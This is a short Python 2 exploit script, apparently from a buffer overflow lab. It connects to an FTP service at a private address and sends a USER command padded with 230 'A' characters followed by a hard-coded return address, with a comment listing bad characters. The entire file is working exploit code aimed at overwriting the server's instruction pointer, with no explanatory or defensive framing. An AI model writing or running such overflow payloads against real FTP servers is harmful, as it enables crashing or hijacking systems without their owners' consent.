#!/usr/bin/python
import sys
import socket

# found bad chars - \x00\x0a\x0d
# 7714b2f6 = \xf6\xb2\x14\x77
crash = "A" * 230 + "\xf6\xb2\x14\x77"

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',21))
	s.recv(1024)
	message='USER ' + crash + '\r\n'
	s.send(message)
	s.send('QUIT\r\n')
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 